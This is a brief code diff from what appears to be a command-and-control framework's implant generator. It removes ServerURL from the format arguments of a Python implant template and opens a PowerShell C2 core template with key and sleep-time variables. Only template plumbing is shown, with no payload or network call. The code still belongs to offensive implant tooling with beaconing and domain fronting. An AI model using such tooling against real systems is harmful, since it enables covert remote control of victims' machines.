@@ -233,7 +233,7 @@ while(True):
       except Exception as e:
         E = e
         #print "error %%s" %% e
-        w = \"\"""" % (self.DomainFrontHeader,self.Sleep, self.AllBeaconImages, self.AllBeaconURLs, self.KillDate, self.PythonImplant, self.Key, self.RandomURI, self.ServerURL, self.UserAgent)
+        w = \"\"""" % (self.DomainFrontHeader,self.Sleep, self.AllBeaconImages, self.AllBeaconURLs, self.KillDate, self.PythonImplant, self.Key, self.RandomURI, self.UserAgent)
     self.C2Core = """
 $key="%s"
 $global:sleeptime = '%s'
